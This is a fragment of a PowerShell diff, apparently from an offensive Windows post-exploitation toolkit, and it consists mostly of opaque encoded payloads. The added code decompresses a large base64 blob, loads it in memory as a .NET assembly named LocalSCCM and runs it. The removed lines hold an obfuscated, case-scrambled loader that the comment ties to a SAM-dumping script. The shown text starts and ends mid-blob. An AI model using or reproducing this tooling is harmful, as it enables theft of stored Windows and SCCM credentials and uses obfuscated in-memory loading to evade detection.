0SR26wnMNVBjSqLNiNOcHBqKc+aZmr0yPhLXE72coEJsaKCtD5r6+ihjauyIjcQG4ojHU2YxFRvG/hN4OuBdqC3VnBwZQVGID42ui6codeijeGg/gcT3diWQOIbgNMwkkjrafPiMnT09y2O9O9FVVyTiQ1jVFRtKT6a2penogao2J8dGJtevi8f6upOtI6jl6GgcHynD+1ckCMFDJz7WYdM+GMX0eU9SpzY4J71x2DOc4NR9lJBe+6lTDK4PB5BIj6+L98dxLEhNYXbUjEdXXocdVFiRGIpzoTPW14f9crnZOOii0gJPjA7GdS5uHB6isy/sNZ4iQ18/kugljLNGo9yWskrd8b1pE8MJxZlg1g7sg8rrYiMI0eitI7sTenKEMssNMeRD/7Sf66CNThLJFJdJwKrYSB8W16FhE8NxNmg2iXJvg9I8lEyZZeyKamjHMygtY6NDfF7sTu6MjxjE1r14VuTJsGjo5nioT5mC9PgomRDNp6fimUXJpDacjXVJLOBJry+5J7V8LDGUNkjodSl6No2lB9Gd9rGDrBsjSl9fUy/1wNi6+HByd9xGIMliEdiITbgUdsdb0Kt78Yw7ntV+AIeQRSK7kdegv/NJjsvsPFxK8amMi2glY7Tx1HI+JEILWSgh6tpxtOfgUhCEodH+CRT0RD3NpTUjcfbz9sTIREs1DwsqN+MSOt8OenL06Ij1DhKyOolArGFyjq5ejDU8EppG4HFwaU0/P8ycnxHONnn8aPW0nhwSLIlhfo7qyd2JvrjOiOEXkCbAph6M6agcen/cij1Y7kzr3Uncp8Z602OINsdG+UmDXDMyNG7FJ1ofgKeRHeh8ILzXMAHgbI3Rk+1EhkWPaR0eTY/TyBHrRRdL9FGpWY/To1uPjaSGqMTW4mWKOuocAZHc15TG2LFjDKsoVllYS3zH2MAArRqLho03JFKJLFoTzvTwjqHx7kR6SrIe64sPx/SdVlV3TEfzrtDRNzAy2SowTlhI6950fISiyWSZZOQNeFibshLnqz8xMCbC5+RqsZGMZleuGIoNpLKGiTYSyys+FNvLpdRkWejofTiZU+kwOq7T9dNUVcOjsZFxq8IIOkxPJ3YkhjD42q2AE04245srdkt2XEgNJveIEvofrljzjsW2gcb3xmGk1dyk6TYBViT14VianZRQEQ5Tg4xQeMfdtHcnYyOdtINzEXc4kxn3peE1/UBrtm2kL74Xy+vi6KlpdOz4UD/sGOuHEbImOupAZkWxaGOvMIO/jluBSRo1nqhrkgurk+g2aAksNsfF01hIhrVmG9NPNenBuEj+oLd30Chlrvl4wRGFjvlGHYbUvqzr1rVjcX3cqB1N7TNKXWM7xLaKS6wjlu4dhPauJnGnQjYToxOrTOA4g2NGGVMKfo4OWqzoeRhIxpmA8gbZoJ1U6Mf54EJfQu80a1hDxqwQxujO+Dg/R03O9vjIABZHVmEgiesGRhUiFzYIQ+KBSUOK0j/ooggiipirNKV6EwkzfWIX6o6ldnbFd41RDpA6Zzi70opV5pbLLPYruolNVsfTvNo5qCKkxEYwjcZGE5lNh24Y4/pwghOJ5sF4704RwvrRczG7iQ2xi8LEy0BoGkL6qpWYCMaGYIUej5vlDoybg/hEXRLD+OwnIaY7dVE4xQU3m+7gexOjWGNsvBbBNELrLkxhITnas5LnXO8ejI2s0QU1E+aHR3HTGUlT2oNdDwyn16cTQ+aOPDQEsb7dONr582b3IbIzro/EhwyELWWUDXEYD8XhB7NNnZA2czeapH/WXkXOnk3omkjIrEKxY6VxSMOwcnNi1Ch2oMa8JgjpFP87+0wEwLQogYO00gpeXaLEG6eZ7qKaw8NxXES9FgknON5Hi8AijVjFWKaEKR/LFU5MgQvaeB0lM/4AlOWhUdoTadx70LMTsRHoSw5j4Fqxq28E+gmM9vFRA1cBHzDoSceejtjeTCYzkWbDeRXacAwKOAAiZCd/MCgeazAdN/IfQRgyiOiHiRE4K4kAs/G4vpz2+7HhEcAUNzlCbtWS2J0gp4e+PUZ0s+5KZtuya5Mq/NtIAzPxMd5vLMzsE5e1YLPOXDbypMTfVjcp47TV2TftKXphg9roHElt+Eq68s+qN4Pdmh0fQtoUIm2k1fE9GEKM4xgR9mRjlIMh3pdglN+etO7tjfP2z56/OpleQecki9qkD4xR96vHhoYsatsIHqcTfTiTIrGwataPxAzrxI0k3KqzBmPRxO7C272eSNF06+O4qwHlDN1JVqptpD85+bzdLeI7V26O60mxqyTpjCwK6OldOxOjtE21jA2Pos4YpZKjwsSmg2C6vAuaMUPlqN/XpxuhQAg3kI0L5y5p1ocMGjJmE2xMOB8TuCyKYFtH4TNl0kREWScQOuEZxUGDYh7cxdjoUj7RG+800u1M3m0YkXdyxIxtBpstH+tH753kRF3xmN6LvgC7zDUBZuQUbs8kPDWncZFiiY+keIiHtmGccJwkXObtyYGBOCbqTE8l+mxnfVieQD8doTyI6vhNAmZs7ck9+Bwmh7e/Acscg9gbdT2p2182Zi1PG3nikGxVfAbOYLN7BeQHRS1zpGbmi2SRtRhmo/4xtUjrpou04Fl7JImH2N4U6LQ4UhOzL8OzjOmZVG2eMSbWZw6bmQq6M8l68Q1TvAzPvqVIQdqemRjnFOMWgtCJb9xFNjWIriJQTFRRC1HmaITP1lRvbDROdyx4VkoNCs1MdROGDGNmEllaTiSK2bFRR61i7+SsifqhJZ+y9myKrylYPTa8Ay2YHjfqJr555WMjZhR0/LXrY+iaCckpjig2lPqxMEyNKFdO8RWaKA2iAUTJ6EIgYmmJMm3LXEjFhozSsHk4F+hOs7CDIfoh+38KXQ3XYYJnkk9d2Rc9gkQDjQ1wnBUEjGyiMMVVr6joFw3HUoO4TmmOacGLNIUJ6PG80GNDONkUBVKTUig0X2I4RbcsFAUy9aQdbqsDY0MxvXWvuQlnOQidOfGwmk41jfRZyWuKXmqL3SI1xR0kjA2tGRUla8cyKcKLsAuTgArgactABiiA7GN/ELPNET4lXp8LSmbzT5kHzFXxIYplHBLYUzLHM4HRzsmFoVHxtCKOwI0rUOGkwqtEUdyJLlqAUdBIfeCEn2Mws5U4GsT+iQRx/ZJ1QWXUmOcEAx2Z6lQh7uDEFNF9MXolj1skbynjNlF0mLlUMl14JxVxRjC1M47LNkvQlibmBrmnIA4az4nR2gg65kzTpU4azxdpUpH3AzxZ8mHGtpcZBDwkt8f7+cljplSRXqUnehMoFp9pthbdI/NyZKwl3h8bw/LgTjy8U8FcsXR7idHb9EdLT7Bdo4qIKabPdq0tyGRh8yRgu6OG1d2G+VHBNOXx7F6UjDS1dhmjMg/CBiK2TOhKImhG45sXxfS1De2f9OhP6AhHObSOpfGADR14lFqNi9K+QIVCdExiTHh2766xBKd/6QxtHU4DzpZJ6+U7ai4OUpKB1tfR59Ab1sX28BUL+RtfD3D4at1LOKXzyIII5jxGXMTDB1+IAB9PjSLX8DlbEMyLX17MdEOCcBB/Jn2cBPQJSIKSewPvToqnWGqiHGMonAfV4Tp6pownqSk8HlLiIUbXqdMAaSB8u01lY1qMscPooMHAI6eEk3DsKbNYMlHSqFieTKZtgviiw5BhnurRFxFk1tjk8Mu5CJ4zRwfHjdSxaWScs1R8sFkpRQYMXyLww6hZEGuMlcUMj2AmalilVjz4WgrRKuJ9ALvmFTUSN7G21CpcZ5TiDJBi4oBsaMlGNnNKg4TZzjBG7mxiptsJ9AlBLUM39bKk8m5kHsrMW4kM3pai88kane9+zRxjHEBZDuA8Gwh2MFzJsJthJ8G8/TAXlsIINMIB2M8QfJ0QB0xV6f9TFohABLogAfuQBhWEtUAM0ohFkCMJfVjXjz9xLAnu1Vg/TNyuPpiFfyV+7uGnbuA64uAkbnDNMrhmGVyzDK5ZzCV5tkAlbAP+FeGKFdjjGGrbx72THr0wiOUE0pCjliTS3/fhC5h8rEFeI8yDU2A2WkL8NAIU6Cghie22YssEythN/0pxbTPaaiucw3L6sB7DAuLN+LcDn+1IGSCrXbAF6lnnZhhi24ygpAhKirEecS4nmSrqUkiJGfqOGtZPIBWzBuaj+n4s6fhMZySMIa5npI8hF7VcekI9e/HvsE0LOMcLpqZdiMewNdVQqwGkDRnjsfoexafQagfWkhbrcb6buSbGmqWo/4PvRrE78TeKXcRwQvfBedCEz834nIvPJfichT89+LMVm21D95sHDWj8heiEMw1nJDmzP4CERpSwCBYYEuYiNn+CtK0o7Vx+Uqs5DJcyrGN4JsLpXDqN4RkMz4NT8WdyD4SZcs0eD4DU8T9h2HXoUMKcH4uiWqdBJ+jsk0n2niFUbSvObD12vJSHQj+CswXrye+pwzNQFeJbhuqI0mzkJ4xaUpszDTqZ+kw4HaqhBuFWNO4yrK3CIW1D40jT2lFuE2qxFKlzwFwhLTjEVoCZfah2P/Y5hpqljSggBtyc8fW9CMHVgpTTMTrNBvA0gIF1ZEtvRgmno2TcrrjlMJqkg9dIDCXGOcKQzIYpOBtQdhVAoxk5WnmdCEPTekmx9XZnpqML2rBvjATOpQQPPmw2tIcRmtsDxsIdxvka4850Xri9TB1jhaIofiZS96D4NAedlawq8SaQrwm7HjrBMo8Y0Fzi7z98K5CIyRYBwAswZnlgN0tLscSUTaIIOjrTKUztxNIQ1kfYxSLoiXEOYSSfQvwAajDAI07x2IQ86nE3Qwx8B1+dynRzT8Jsqf+vJovgtI2yNwueBNYNvcdAZwIUt6Cvkr+2YQDqgk34042e1gEwwzQ87ZUmTySbp9Tcffp5vQzB0oyLgYK7X621Pw3jahiz1UcQj5h79RZae80cLNpQ9iZctZ3s3WS3ccQo/PTyJKd5DziR1rSLif1kA499K8D895MtsFY4GwNVgq0OtauRM4I9rMfnKlhja5s1/m2mjToyOcR4Zj2eaAcUM01jGTD609ldyXHH7RZc+UGtItpNtIGl5TrkFHOf/p/TsstcK+2oT5OxVZhaRaDW4KvF8gj7ZgTbi7oEr6Uhm1dT/lUJkvMsnGHwdXFveyiTcVHOtxIjrcjbYgBrp553IceM1Trbq4v72zqBupU3pljGbtA8VaRNsoVGMvYyvTdq+C4FSWGNeSTj7KlkUPsxHqPO2p+krEJ7FGjhKEKzBz2TcyLBOWJIJy7i2cEtt/K8i605wUFRZ+9ZgxY9iz2sG9vP5n2rG39g24nkC03mo3b/Den1Izwbe5hzJ1IofsbZ+5omxFI49CmRlPbg5nhyjWbjFn9a1jLJdscNRugTjn465kiN+HMGtqnknKo5oyhhIg05cd+daHB6iro+lEP9n8kJyTb+IcmUnJxIozP+jzVeb2wBI8bx5l/RGErTPO6dTN+FlicHFz3AwftOw8Zd6B8t7BnWjtP3vzTY7hMo8y8NrVbkpENMTRt6bOAEg3ZTkdaSZ55pembzSTTYiinjXPxrPoXiJ9Ny9RTzlC3rf8OkJ6OZ2FzG/lVDF8S4h+wtDA5e9z89lDVGTqVPsew+oMqzsiOXmfuJhTUxE7QWici67J45tZdFcJVkmxh8yYz2cKaVCrcYeo1j3J28m4i9RPRqM+2sD+JucLo3k7l9kHZLuQWc+kHaWo7E55b6kw+3sMTS8uRDHvdyyvu3m9gbt5s2l88BJmzNgnDwXVOsmQY0seOaaT1tkwkjfU8YCX+ClRI8CXYk+8TRcSLGVLEZj/CpOwZ9HFAbON0Skcji7LWddcZYTl/mNDRmnKCs6xfraqeWWw8bFyviUDHRrYXeIhWIsdwk9kRmbMK/0pwPNuHvNdkTpw3mWJPdie1jhiXFcTzbajxVS7yZWTCTRstGZiral7WUyFJ46pxp9aMbx6leo5ZaCFkT+1jN9h21hY+JS1Dck4jjJCSslidKlcScx7P0pdGKdDxiJJeJrHrdmBfT1jiatvcOGycXilIkyZMJDz7bHDb964HCSLw/kITscGFIOOVfnOmm95rpE2tj6zn+3tb9IFtGxPCVPrAf39nyBz9lDtBa7on/z4vdC1LT1FE0krWQI1NG4IlT/94SporFhoT17zWF/7Je/w2p76Hr6e/tLCfOGNgJCik89EzKc+1OPDksnljmVLMw1WhPSkKb/U1DL58L7aFwK99hWZ62lW2WRlnk4vbLOWj8oEc+qDRbnOgkQLnPySfr1n2JCOkfZAkTZRBpu3k10Qk5zuHUFvjPzpb+XnP+vrLOyZZ1sqH8feUe/Iwp2H4BOsKdmCEhZlNThIX33vvMa1Ez7xEhSbxF6DUuKs/BSWozdrGJVwr8f+s++HP7dbAVAen2Ubwli7NiooNYVvJlRU4aL92b62wh60Z18nZr2YmkTjWsqeNvFO06xhIowo5nSRplrt08PxSh6bJ6JoCyFcBJL2BA2Y8b7EqMTnSfvxRg0xbYOOlOaZRnNZWJHcPsR+JWWtzRRVgr8RrGfgsnVi2dEaQ1puSOk25t2mgEseyEpBKkauuN4Yne6kVsXttk+KmwSwvPiPDdpHHbaL7TMF8wnfhtIb332EhvN1s/uPQoe8hefgNFmfxenAN0Nm0PW1e85qJZhlP/GzeDzf8DN4IVdZg0LuMoNmz4kXVruw13iKlrwLOPF+YOHIE54028SmjUvbzYrHiR5Ihm+rI91Wm2rbSp06oIx5gkwtm8v1KoGMOaUR63uaPQYh9giggJw1k7iaUhcQ2yZw7Cyd4e2yTl7If9Rpn+QnLi4WziG7U0axS3vVOzVmEXrEKNGtkXdbZy9ptwc+as1QVnn9w9bQeHTJ3DHQXSNN/z2/dhjAltJ3Mne1KSAlszeQ9iB79OFyHifbJ4G03vplcAvanu5zfFi3EoWxDbdkKOBf8nHI28BKQlU01e2tjgBiYtJNt0zAmAdYViD5eRTMizJhTDbqHpLkLWUlOOgj8DwjkjWa5fm+l1jhFGqMVSdOfFE16AZIexIWNjmbhQMKAGUrwAFvLoYSBm9Gotiv+VXpesQldq4g8izGRywFiswkqD7E47eTHEjG2CWoKCYVipw58GdLRzcMm0wjq+HoE8eonWwngEz7ubiFZKL7jajZMvbRpr+EOMbgx/kDOTs491SKMtG3KyeenjF1tthTmv58Ba5IoYiZRuvKqC+WZ9K9onzpawgu4J2szMTq5OnPfgIhKZRzwrlxdxIcW7BH19Y35fJJwmYThfwjisxkG8wraysAYwj/jjTBN771S5ydRvlMUZ0BqUqdMwRkLreur9dwEzp9nDGZfICCyp5njNHdpM4bKuSWas5yx6r2ELcx+I25YwDFhHeDMLE+Oe/JbdPnbrbJs0dO1ljqnfa54J0PuvjH2A59b+1lQ39n/xLjWeud7hsWjWaUjknPQVh3Cm9baczbSVkEa7Tp+VzVRsBUtKF3J28edBwm96bGdJu8RsSX1gf/dPFuoD85bVytRozCOZM4PpvUlrHx2wLGY/+aSN84uw/4nGMvkiJsaLb9DY//dldm1apJUZnSbmGb1Zepq9w0zauiZ/+Wa3nTED1W2c9cc4ExKSxak/xbl0L48CDr5mKtE96dhgvz6xEntTQfGdiRUlhoyoaP+0IzHFpYt1D9htLFN7yLAWmDjWCEcwD+p2M0dxp0zx9zAzwfoMb/L0m5y9yCfFxCKgZTVotDG1nnph9PNIxllDa5eduGBsu25jdtyuy4rqw7ysYujOvXx1QY4FOT18UG9Hd+ui/7nUSvFp5X/3r+Rs4H1kKe8CwzyucYDKpexwscyBpo9naZT1odmQiiOGA8fY/iLXoDkBzcwMMqPNm5zAw7TJNFtKnzc5GYb5TZNoIjcZmeBtI8ZnN/QJWop9Lo1LossovW8bbXTiC5XGiZdX7yvDyFDmYY6yCMNKi7Gp7Ta8yMys0rwcxWmfbIctXWdzHfz1T9FfPbO/ePnXHrhjjSP0g19TEiE5IpLkdiLQCqgYJCC7XEpoWahDVkHSDnUE8RE6tDbopsd67dAmT0TBShkRJ0Do4LPOCMJLGN6AMoOBXEkqCB1KSOUQOjTs9Eqhg0c8BaGDr8pYkJ0RWSorysuVZNlg4qpyoG6nBd0aSpW09V43yNp6+kta4ENRtfUukGVBUoLBsrKQyy/LQW0TtgpiIbQttBb1D7pd4AjSHwfgiEjaJoLBaQSnBYOoo9cJssFQludyoSZxKRgMJULDBdouLDkFARyhRFA79DHt0GHt0CU02kNHPKh/6NCnsIR9yUGyXR64I0AN88DJ7R0RyCPzytNcPiGbRAdDY6Hx0IHQwUM44o+heBXk0Bjr48YWoXEslGmW8YyH4pWCKpeD/6+9q4uN46rCd2bn5+54d7yzTmDSeM121aAEsc5PbceN4roBJ8LISQt1Aw+WyMZe41D/rLxJSJAqdswTEkjwABKCSkUiD4lUqX0AhFCE8tCHIuUhD32oREQrFIkilTYPPEQqiO87d2a96wSRJ56Y2Tlzf88959xzzr2eGd+bryqpOqQ8g8L1bTDPDVs8HyIBh8CTXPOqIPE6ImQSkUpYyXnkuBJ+xh8IDUVXy52fheiycueX5QaJMpwTwZuAUXJTwg1NZA3pbWAY1ugll6dHNBW3oFzk39a8tIjZRUErHEYnAQ6P+IPoms61cuc6IChx0xOdZsoCq+OVk7sF6FVyF/J+P0ruiTpdK1VdCwn3ouSDKPkwSu6DGajTdXMjn9Cp64HvZFj3+lG583pPC4jpONYIatuLISlqB+kappA6rw/nFfvzdrTlTvulELLpvEl6f20C5BFdRsWQeLg76vyumzyjNfUMWTcRBXIbGiVqZYfFqmNt606+i9eH/oTRVpH3ITVkFXobAk1D1CKQdil0YDmvlEQfmtvq4JmSA9Q4kGJQ9BBlMm53M25nGVRKC5ihrRTuViQCuKP9lPygamkJooDvlDtvhUYbOm+JHkxB3YfDQV8jodx5m30H5vOwY6tUGVEaaurScbBemfVvmV8qN8eHrkBJNYqCMZj7iKIBDSMjan3aTwUUstMq6Vlu+GkqyAZDw36hWwrl+osCT/nrgTJORWth6wNb23tAYb9BZf4GFGel3CdKmTuy+kuNWE6AfPq0ynYfiPq9Q/WLtiqDvo8ILKniUiiuh57Fna4oFE9F7u049uF9yltP0t7joh/EOqYIeUJhYq2hl0zRVb9Y7tylfb5LNYbSvC+/ewwjNZGOuyuds7WPka0D4ocqbuqcoq26kJj8BJ0OG6vSKg2rObKdk9I56d27g37e1hUXTdtRCQHSARhrDzyPqBi9FZXoKUG0W+7cJ03lBjqTo8bWuNw6Hwquf+qqOAeth/y8MUINffmHCQKHm6M3Qhgy68sNqDEPkECPAEwPCr5HfCzCJAwBdC4YHbTvQZZxnKfniGPbg13nh/0yikUJXCS6XmoRGlLh+UCMxo0ZfjXHXtIB3BPsnm5r2h/KrFtcWlcJAV1jQlCw3rAxuDCNc1hxQz+N+WlmCZ7WUCKcQheg/QHkpmxAnfrNgFcQ0KmWE/zASqgz0SEtE17KTN+wKTd0SprHokXKVWc/DgCwBGW78DgnaasaSgwL9F1qZSWMH2EccguNBSd7ykmlnDxp9Ap5e6Sfb+Vh6Mk+mh2ctuRszZa3ToujqHPET8bTET8Zt7uh0AvkVvK9sJwcYLWvADnMnD4RKaLRs4LlpQg0oj0zVsHlJPuQXhlSe/3AeCAMWslhoGNHwdE+A8OQmocFjhd7RAVjr4R2JbP2kCYdyhj3zAA5IRpUl3kDRgZOUcTnoFe17xptCjI5yygHU7M9W8afpCGY7sPUoll6oS9pw/ArNmNzMgG6k02A7kjiCxwici47xjjjhgjtRCaqE7ZWOehQtNXUv/3Owtk9Y+99X78x/Y3vRu8Exxyro5RjE+QIuJC/4xIo2Q5OdhasEvwKwFoGyBPkCBwCm8BaYYjAusEQQY7AkdBrAAHLDRAUCDTbsOZYmCBH4BM4BC6BR1CUJlk4IBggCJk2SFAiiAQpM4qSKyywXYvt5mrpJgGOeo7gHIEwyFz1Hssx1ybIEbC04xJ4BD4BtzVwuEC/UyDgVgZOSMAdAxxuO+FEBAHBgLRmEzgEHoEmCAiAAf0LcIjgOQJuOuucI2gRdARBiQC0OR9LdJDgY/4zmmUVep8xWtoe2W/ttUcw3bZ257wKPGO0i9OgkwhcwTWLSOeHthcWvd5RXHvZbMPDkI4idxCYl1SOdmkAXt6LFnCdw7WEawXXKq4WSl8MvK6adYPjPcEwQ8cZKibYs5zVBDKrswWGMs7SVdr4I8GGmWDio8TDW3aRE6ruuK+ZLR6e9gjvgx/sB4mBstIyIbqQf2Wg2rvSYiksqHRKpzG25FU65aQrkzuyEYh2VdwSfJ5JTJFtoyUlqU+W+aqSkScwmOkggwxvxR1Qdjb3C9EcEOpS1PIRivOlWO66FNNq47xydR5utRTvUQUdYw5ZYqT3jAPl6TjExLOkUUezjl2KgTrPUJwnUoyzNgbdfB6FOZDl45IZ0/JF5cNvR6vgDigQgyPcDf8FSWEWNCCOeXeYJuCgjKUInIbkGGEmuwvKo/O8Re9n+9Ivb5t7MmUPYIIKdRNhBOLFJZw3yeg5bRLTvwlOYlrDYUzcovF8nR9zXiazVno2Tuc467FzABhvxTmOm9sJ3EDiuLufqJz9UJbcfqW1lW4+Inu6z9uf+tpmo3WmZ4mc+ZXNjW+3LZSzpVxoqfz2KtMYQpl4wFJPLU9OHD0yMXG0fnTx6bH62PL4ofrkobFGfXJi8uiRxuLhsYllmG7BUv7kqJxKnbbU8OiZk/Pd1QQ/n66dNHV5bPTo6BEQFO7qZqZ7CnABjV2sVe3mVKW0kHf6zzd+wzuJfRXXzF9x/VH1HaX+qPrqizMv/v2nz0396efOl2+++uDGXzp7v0e2vnhsgesftBfai4tr9Yb5B/n6UmOUrM+d+MLCTLP98sWN1gLXjGwxsc7Vq+pd8aRLnO3I3xndOP+thSsTYwvpv7cvbK8B2Fo6n9GoXcceyBdz0KdCGAz66v/HIw5b+raqVIfb3LzADcv7Dkv2HJp8RDqPHYnd8iv/ofwP4DV/hPAn9nbOJ/YY4Fn5fumsvATiu/fn1RnEZwFPKdleXt10PvoX8egd53SKx+m2sn3MSJr5iudU+oZiVr7J2JD8p6TWvLxpX5fvLRrdR5rmeMNZkB1mex/uPYxpUsoc6p5j6rziqPuEyMO8ec/eRLdTzLWevFb6DUn3I8r0OM4v6brtzcgTafOGqNVH51z3Q5nskbRC+7qnbv/38Ur6dLTnYlvcX2o2falnvnxb7aHo4TZG5UEw8z4rvMzJy8Dsq60W+NmUb19W+OhRjs/tKGckvyRvnhryfUm7y/uM0PN8iuNCSk/Gz/pj0TUm8jMPxJfUJXk/0CvjR8ltTOTWX2en9HbKblLqnJDHo+TlfPoK9b/V+0XOUn/rUdqPfv+H49NX1larl1OvXjs8eqhWbaYLhU7VXpo/VZ+sVbk01FJjdWO9OVW72mzXpp8tBsXgeCNddLUKFOvtqdqlzfVj7cWV5lqjXV/LNtWpL26sHWu010YvH65V1xrrF5ab7Ytne9sDsmq1iyxbg6GPJp616jpGk6na6asnWmZtQOSONlqt2kGD4eLmJa6burzxmPQcMS2jZjtdFiKNI2XTLKvWXOLuKhdWm99sth8T69O1LpZePGalWVA817zcXK2uEk7VGu3Z9csbLzc3a9VLF8wqO1O15cZqu5kyJUgOPoKajPSDfbQfP9gVAuLHD2ZCffYhx/k/O/4NugC7MQDSAAA="))
+    $gzipStream = New-Object IO.Compression.GzipStream($lss, [IO.Compression.CompressionMode]::Decompress)
+    $memStream = New-Object System.IO.MemoryStream
+    $gzipStream.CopyTo($memStream)
+    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
+    $currentConsoleOutput = [Console]::Out
+    $textWriter = New-Object IO.StringWriter
+    [Console]::SetOut($textWriter)
+    [LocalSCCM.Program]::Main()
+    [Console]::SetOut($currentConsoleOutput)
+    $textWriter.ToString() | Write-Output
+}
+
+$Out = Invoke-LocalSCCM 
+$Out | Out-string
+'@ 
+
+
 
 # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
 $Global:LocalSAM = @'
-( New-ObjECT  SyStem.Io.StreAMREAder((New-ObjECT sysTeM.iO.COMpresSIoN.DeFLAtestrEaM( [iO.MEmORYstREam][sYsTEM.CONveRt]::FRoMBASE64STRInG('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